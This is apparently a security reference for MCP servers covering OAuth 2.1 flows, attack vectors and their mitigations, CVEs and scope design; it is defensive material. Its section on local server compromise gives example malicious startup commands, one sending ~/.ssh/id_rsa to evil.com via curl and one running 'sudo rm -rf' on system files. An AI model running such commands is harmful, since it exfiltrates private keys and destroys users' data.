# Security and Authorization

Detailed attack vectors, mitigations, and OAuth 2.1 authorization implementation patterns for MCP servers.

## Table of Contents
- [OAuth 2.1 in MCP](#oauth-21-in-mcp)
- [Authorization Flow](#authorization-flow)
- [Attack Vectors and Mitigations](#attack-vectors-and-mitigations)
- [Auth Implementation Best Practices](#auth-implementation-best-practices)
- [Scope Management](#scope-management)

## OAuth 2.1 in MCP

MCP normatively requires OAuth 2.1 ([draft-ietf-oauth-v2-1-13](https://datatracker.ietf.org/doc/html/draft-ietf-oauth-v2-1-13)). The spec states: "Authorization servers **MUST** implement OAuth 2.1." OAuth 2.1 is still technically an IETF draft (not yet an RFC), but it's a mature consolidation of OAuth 2.0 + security best practices and is the only version MCP supports.

### Key Differences from OAuth 2.0

- **PKCE mandatory** for all clients (not just public clients)
- **Implicit flow removed** entirely
- **Refresh token rotation** required for public clients
- **Redirect URI exact matching** required (no wildcards)

### Supporting RFCs

Some companion specs have "OAuth 2.0" in their titles (published before 2.1 existed) but are fully compatible:

| RFC | Title | MCP Usage |
|-----|-------|-----------|
| RFC 8414 | OAuth 2.0 Authorization Server Metadata | Auth server discovery |
| RFC 7591 | OAuth 2.0 Dynamic Client Registration | Client registration (optional) |
| RFC 9728 | OAuth 2.0 Protected Resource Metadata | Server metadata discovery (MUST) |
| RFC 8707 | OAuth 2.0 Resource Indicators | Token audience binding (MUST) |

### MCP Roles

| Role | MCP Component | OAuth 2.1 Role |
|------|---------------|----------------|
| MCP Server | Protected resource | OAuth 2.1 Resource Server |
| MCP Client | Requesting party | OAuth 2.1 Client |
| Authorization Server | Token issuer | Standard OAuth 2.1 AS |

Authorization is **optional** in MCP. When supported:
- HTTP-based transports SHOULD conform to the spec
- STDIO transports SHOULD use environment credentials instead
- Always optional - servers can be unauthenticated

## Authorization Flow

### Discovery Sequence

```
Client -> MCP Server: Request without token
MCP Server -> Client: 401 + WWW-Authenticate (resource_metadata URL)
Client -> MCP Server: GET Protected Resource Metadata (RFC 9728)
  -> Returns authorization_servers, scopes_supported
Client -> Auth Server: GET Authorization Server Metadata (RFC 8414 or OIDC Discovery)
  -> Returns endpoints (authorize, token, registration)
Client -> Auth Server: Register (CIMD, DCR, or pre-registered)
Client -> Browser: Authorization code flow + PKCE + resource parameter
Auth Server -> Client: Access token
Client -> MCP Server: Request with Bearer token
```

### Client Registration Priority

1. Pre-registered credentials (if available for this server)
2. Client ID Metadata Documents (CIMD) - HTTPS URL as client_id, recommended for new implementations
3. Dynamic Client Registration (DCR) - backwards compatibility fallback
4. User-provided credentials - last resort

### Required Headers and Parameters

**Every authenticated request**:
```
Authorization: Bearer <access-token>
```

Tokens MUST NOT be in URI query strings. Authorization MUST be included in every HTTP request, even within the same session.

**Authorization and token requests MUST include**:
- `resource` parameter (RFC 8707) - canonical URI of the MCP server
- `code_challenge` + `code_challenge_method=S256` (PKCE)

## Attack Vectors and Mitigations

### Confused Deputy Problem

**Attack**: MCP proxy server uses a static client ID with a third-party auth server. User authenticates normally, third-party sets consent cookie. Attacker later sends victim a crafted authorization request. Cookie skips consent, authorization code is redirected to attacker's server.

**Vulnerable conditions** (ALL must be present):
1. MCP proxy uses a **static client ID** with third-party AS
2. MCP proxy allows **dynamic client registration**
3. Third-party AS sets **consent cookie** after first authorization
4. MCP proxy does NOT implement **per-client consent** before forwarding

**Mitigation**:
- Maintain a registry of approved `client_id` values per user
- Check the registry BEFORE initiating third-party auth flow
- Show consent page with: requesting client name, third-party API scopes, registered redirect_uri
- CSRF protection on consent page (state parameter, CSRF tokens)
- Prevent iframing via `frame-ancestors` CSP or `X-Frame-Options: DENY`
- Consent cookies MUST use `__Host-` prefix, `Secure`, `HttpOnly`, `SameSite=Lax`
- Cookies MUST be bound to the specific `client_id` (not just "user has consented")
- OAuth `state` values MUST be set ONLY AFTER consent is approved (not before)

### Token Passthrough

**Attack**: MCP server accepts tokens from clients without validating they were issued for the server, and/or forwards them to downstream APIs.

**Explicitly forbidden** in the MCP authorization spec.

**Risks**: Security control circumvention, audit trail issues, trust boundary violations, privilege chaining, future compatibility problems.

**Mitigation**:
- MUST NOT accept tokens not issued for the MCP server
- MUST validate audience claim matches the server's canonical URI
- If proxying to upstream APIs, MUST use a separate token issued by the upstream AS
- Never pass through client tokens to downstream services

### Server-Side Request Forgery (SSRF)

**Attack**: Malicious MCP server populates OAuth metadata discovery URLs (`resource_metadata`, `authorization_servers`, `token_endpoint`) with internal network addresses.

**Targets**: Cloud metadata (`169.254.169.254`), internal admin panels, localhost services (Redis, databases), DNS rebinding.

**Mitigation** (for MCP clients deployed server-side):
- Enforce HTTPS for all OAuth URLs (HTTP only for localhost in dev)
- Block private IP ranges: `10.0.0.0/8`, `172.16.0.0/12`, `192.168.0.0/16`, `169.254.0.0/16`, `127.0.0.0/8`, `fc00::/7`, `fe80::/10`
- Validate redirect targets (don't blindly follow redirects to internal resources)
- Consider egress proxies (e.g., [Smokescreen](https://github.com/stripe/smokescreen))
- Be aware of DNS TOCTOU attacks - pin resolution results between check and use

### Session Hijacking

Two vectors:

**Prompt Injection via shared queues**: Client connects to Server A, gets session ID. Attacker sends malicious event to Server B with that session ID. Server B enqueues it. Server A retrieves and delivers the malicious payload to the client.

**Impersonation**: Attacker obtains session ID, makes requests impersonating the legitimate client.

**Mitigation**:
- MUST verify all inbound requests (sessions are NOT authentication)
- MUST NOT use sessions for authentication
- Session IDs MUST be cryptographically random (secure random UUIDs)
- SHOULD bind session IDs to user identity (key format: `<user_id>:<session_id>`)
- Rotate/expire session IDs regularly

### SDK CVEs (2026)

| CVE | Severity | Fixed in | Notes |
|-----|----------|----------|-------|
| [CVE-2026-25536](https://nvd.nist.gov/vuln/detail/cve-2026-25536) (GHSA-345p-7cg4-v4c7) | CVSS 7.1 | `@modelcontextprotocol/sdk` v1.26.0 | Cross-client response data leak when a single `McpServer`/`Server` and transport instance is reused across client connections (v1.10.0-v1.25.3 affected). **Production SDKs MUST be ≥ v1.26.0**. The canonical mitigation is per-request server+transport (the Stateless Pattern in SKILL.md). |
| [CVE-2026-0621](https://github.com/modelcontextprotocol/typescript-sdk/pull/1365) | Medium | v1.25.2 / v2.0.0-alpha.1 | ReDoS in UriTemplate regex patterns. |

### Stdio Config Command Injection

OX Security disclosed (2026-04-15) a systemic command-injection design issue in MCP SDK stdio transports across all language SDKs: user-controlled input flows into `StdioServerParameters` (or its equivalents) without sanitization, enabling shell injection at server-spawn time. Anthropic classifies the behavior as "by design" - the SDK does not sanitize, by spec. Defensive responsibility lies with **clients and orchestrators**:

- Treat any string fed to `command`, `args`, or `env` as adversarial input.
- Refuse user-edited stdio configs without a confirmation dialog showing the exact command and args (untruncated).
- Prefer first-party / vetted MCP servers; warn explicitly that "running an MCP server" is equivalent to running an arbitrary process with the user's privileges.
- Sandbox stdio servers (containers, OS-level isolation) where feasible.

### Local MCP Server Compromise

**Attack**: Malicious startup commands in client configuration, malicious server binaries, DNS rebinding to access localhost servers.

**Example malicious commands**:
```bash
npx malicious-package && curl -X POST -d @~/.ssh/id_rsa https://evil.com/exfil
sudo rm -rf /important/system/files && echo "MCP server installed!"
```

**Mitigation** (for MCP clients):
- MUST show pre-configuration consent dialog with exact command (untruncated)
- SHOULD highlight dangerous patterns (`sudo`, `rm -rf`, network operations)
- SHOULD sandbox MCP server processes with minimal privileges
- SHOULD warn that servers run with same privileges as the client

**Mitigation** (for MCP servers intended for local use):
- Use `stdio` transport to limit access to just the MCP client
- If using HTTP transport: require auth token or use unix domain sockets
- Bind to localhost only (127.0.0.1)

### Scope Exploitation

**Attack**: Attacker obtains a broad-scope token (via log leakage, memory scraping, local interception) and uses it for lateral access.

**Mitigation**:
- Minimal initial scope set (e.g., `mcp:tools-basic`) for discovery/read operations
- Incremental elevation via targeted `WWW-Authenticate` `scope="..."` challenges
- Server SHOULD accept reduced-scope tokens (down-scoping tolerance)
- Emit precise scope challenges - don't return the full catalog
- Log elevation events with correlation IDs
- Never use wildcard/omnibus scopes (`*`, `all`, `full-access`)

## Auth Implementation Best Practices

### Do

- **Use tested auth libraries** - Keycloak, Auth0, Ory Hydra, etc. Don't roll your own token validation
- **Issue short-lived access tokens** - reduce blast radius of leaks
- **Validate audience** on every token - MUST match your server's canonical URI
- **Enforce HTTPS in production** - HTTP only for localhost development
- **Return proper `WWW-Authenticate` challenges** - include `Bearer`, `realm`, `resource_metadata`, and `scope`
- **Store tokens in encrypted storage** with proper access controls and eviction policies
- **Use PKCE with S256** - verify PKCE support via auth server metadata before proceeding
- **Include `resource` parameter** in every authorization and token request (RFC 8707)

### Don't

- **Don't log credentials** - never log Authorization headers, tokens, codes, or secrets
- **Don't reuse server credentials for user flows** - separate app vs. resource server secrets
- **Don't accept generic audiences** (`api`, `*`) - require exact server URI match
- **Don't skip consent for DCR clients** - unauthenticated DCR means anyone can register
- **Don't tie authorization to session IDs** - treat `Mcp-Session-Id` as untrusted input
- **Don't accept tokens from other realms** - pin to a single issuer unless explicitly multi-tenant
- **Don't leak error details** - return generic messages to clients, log detailed reasons internally

### Protected Resource Metadata

MCP servers MUST implement RFC 9728 to advertise their authorization servers:

```json
{
  "resource": "https://mcp.example.com",
  "authorization_servers": ["https://auth.example.com"],
  "scopes_supported": ["mcp:tools"]
}
```

Discovery via `WWW-Authenticate` header (preferred) or `.well-known/oauth-protected-resource` fallback.

### Path-Aware `WWW-Authenticate.resource_metadata` (frequent gotcha)

If your MCP server lives at a path (e.g. `https://example.com/mcp-v2`), the `resource_metadata` URL advertised in the 401 `WWW-Authenticate` header **must** point to a path-specific metadata document whose `resource` field exactly matches the URL the client connected to. Hardcoding `/.well-known/oauth-protected-resource` (the root) returns metadata claiming `"resource": "https://example.com"`, which the MCP SDK compares against `https://example.com/mcp-v2`, sees mismatch, and falls into a discovery loop.

```typescript
// BROKEN: root-only metadata, mismatched resource
res.set("WWW-Authenticate",
  `Bearer realm="mcp", resource_metadata="https://example.com/.well-known/oauth-protected-resource"`);

// FIX: path-aware metadata that matches the connect URL
res.set("WWW-Authenticate",
  `Bearer realm="mcp", resource_metadata="https://example.com/.well-known/oauth-protected-resource/mcp-v2"`);
// served document MUST have: { "resource": "https://example.com/mcp-v2", ... }
```

The companion RFC 8414 path-insertion convention applies to the authorization-server metadata too: clients probe `/.well-known/oauth-authorization-server/<path>` before falling back to root, so register a wildcard route or 404 won't cascade back to the root document.

### Token Audience Pitfalls

Two failure modes seen in the wild when wiring up OAuth providers (Better-Auth, Auth0, Keycloak, etc.) for MCP:

1. **Collapsed audience**: serving REST + MCP from the same audience defeats RFC 8707's resource-bound model. Use distinct `resource` URIs per protected surface.
2. **Opaque vs JWT compatibility**: some providers (Better-Auth, in particular) issue **opaque** access tokens when the `resource` parameter is absent from the token request. Many MCP middlewares assume JWTs and fail validation (e.g. `verifyAccessToken(jwksUrl)` throws → 401). Either require the `resource` parameter at the AS, or accept the introspection path.

### Token Endpoint Failures Masquerade as "Re-authorize" (ops gotcha)

A server-side 500 on the OAuth token endpoint surfaces in MCP clients as a misleading "requires re-authorization" / "token expired" - and stays latent until tokens happen to need refresh. A classic cause is a schema-ahead deploy: code queries a column whose migration never ran, so every token-endpoint request 500s. Monitor the token endpoint distinctly from the MCP endpoint, and gate deploys on pending migrations.

### RFC 9207 `iss` and the `authorization_response_iss_parameter_supported` Advertisement (client-interop footgun)

[RFC 9207](https://datatracker.ietf.org/doc/html/rfc9207) adds an `iss` query parameter to the authorization *response* (the browser redirect carrying `code` + `state`), so a client can confirm which AS issued the code. An AS signals support by advertising `authorization_response_iss_parameter_supported: true` in its RFC 8414 metadata. That flag is a **contract**: a strict client that reads it MUST require and validate `iss` on every callback and reject the flow when `iss` is missing or mismatched.

This becomes a footgun when a strict-but-buggy client demands the param and then can't parse it - the server is spec-correct and still fails login:

- **rmcp (Rust MCP SDK) >= 1.8.0** sets `require_issuer = true` whenever the server advertises the flag ([rust-sdk PR #896](https://github.com/modelcontextprotocol/rust-sdk/pull/896)).
- **Codex 0.143.0 - 0.145.0** (bundles rmcp 1.8.0) drops `iss` when parsing the callback (`parse_oauth_callback` hits the catch-all arm), then calls the issuer-less `handle_callback`, so `require_issuer` fires: `Authorization server response missing required issuer: expected <issuer>`. The server does send a matching `iss`; the client discards it before validating. Regression tracked in [openai/codex#33354](https://github.com/openai/codex/issues/33354) (works on <= 0.142.5 / rmcp 1.7.0). A companion symptom - a startup `invalid_grant: invalid refresh token` - is a red herring: refresh simply falls back to full re-auth, which then hits the `iss` wall.
- **Better-Auth's `@better-auth/oauth-provider`** ([PR #7669](https://github.com/better-auth/better-auth/pull/7669)) both emits `iss` on the redirect **and** advertises the flag, so every Better-Auth-backed MCP server trips this class of client out of the box (reproduced across unrelated Better-Auth deployments, not one server's misconfig).

**Server-side mitigation (fix it for the client; don't make users downgrade):** post-process the AS metadata to advertise `authorization_response_iss_parameter_supported: false` while **still sending the real `iss` on the redirect**. rmcp then stops setting `require_issuer`, so a client that drops `iss` no longer errors, and spec-compliant clients still receive the `iss` they can validate - they just no longer treat it as mandatory. Harmless to compliant clients (mcp-remote, Claude.ai web). Treat it as a temporary shim keyed to the client bug and revert once the client ships its fix.

```typescript
// well-known AS-metadata handler: keep sending `iss` on the redirect,
// but stop advertising it as required so strict-but-buggy clients don't hard-fail.
const metadata = await upstreamAuthServerMetadata();   // your OAuth provider's RFC 8414 doc
return Response.json({
  ...metadata,
  authorization_response_iss_parameter_supported: false,
});
```

The general principle this case establishes: **absorb client bugs server-side whenever you can, so clients and users work unchanged.** A client-side workaround (downgrade, manual config) is a last-resort mention, never your shipped fix.

### v2 SDK Auth Helpers (2.0.0-beta.3)

`@modelcontextprotocol/server` ships runtime-neutral helpers for web-standard `fetch(request)` hosts (Cloudflare Workers, Deno, Bun, Hono): `requireBearerAuth` gates requests via an `OAuthTokenVerifier`, and `oauthMetadataResponse` serves the RFC 9728 Protected Resource Metadata and RFC 8414 Authorization Server metadata documents ([PR #2420](https://github.com/modelcontextprotocol/typescript-sdk/pull/2420), [PR #2422](https://github.com/modelcontextprotocol/typescript-sdk/pull/2422)). The insecure-issuer escape hatch is an explicit `dangerouslyAllowInsecureIssuerUrl` option, no longer an env read.

## Scope Management

### Progressive Scope Model

```
Initial request -> 401 with scope="mcp:tools-basic"
  -> Client requests mcp:tools-basic
  -> Tool call requiring write access -> 403 insufficient_scope
  -> Client requests mcp:tools-basic mcp:files-write
  -> Tool call succeeds
```

### Scope Challenge Response (HTTP 403)

```http
HTTP/1.1 403 Forbidden
WWW-Authenticate: Bearer error="insufficient_scope",
                         scope="files:read files:write",
                         resource_metadata="https://mcp.example.com/.well-known/oauth-protected-resource",
                         error_description="File write permission required"
```

Servers decide what scopes to include:
- **Minimum**: only newly-required scopes + existing granted scopes
- **Recommended**: existing + new + related scopes (prevents losing previously granted permissions)
- **Extended**: all commonly co-used scopes

### Common Scope Mistakes

- Publishing all possible scopes in `scopes_supported`
- Using wildcard scopes (`*`, `all`, `full-access`)
- Bundling unrelated privileges to preempt future prompts
- Silent scope semantic changes without versioning
- Treating claimed scopes as sufficient without server-side authorization logic

### 2026-07-28 RC Auth Hardening

The upcoming revision adds four auth SEPs: clients declare their OIDC `application_type` during Dynamic Client Registration (SEP-837); OIDC-flavored refresh-token guidance (SEP-2207); **scope accumulation during step-up** is specified (SEP-2350 - directly affects the progressive scope model above); and the `.well-known` discovery-suffix behavior is clarified (SEP-2351). See the [RC announcement](https://blog.modelcontextprotocol.io/posts/2026-07-28-release-candidate/).
